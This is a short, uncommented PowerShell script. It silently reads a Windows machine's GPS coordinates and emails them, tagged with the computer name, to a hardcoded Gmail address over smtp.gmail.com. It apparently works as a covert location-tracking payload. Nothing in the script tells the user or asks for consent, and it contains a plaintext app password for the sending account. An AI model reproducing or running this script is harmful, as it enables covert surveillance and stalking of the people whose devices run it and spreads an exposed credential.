Add-Type -AssemblyName System.Device
$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
$GeoWatcher.Start()

while ($GeoWatcher.Status -ne 'Ready') { Start-Sleep -Milliseconds 100 }

$Body = $GeoWatcher.Position.Location | Select Latitude,Longitude

$From = "thomasscmtrp@gmail.com"
$To = "thomasscmtrp@gmail.com"
$Subject = "Location from $($env:computername)"
$Password = "inxp oacj koiw ytgi" | ConvertTo-SecureString -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $From, $Password
Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -SmtpServer "smtp.gmail.com" -port 587 -UseSsl -Credential $Credential

Exit
Exit
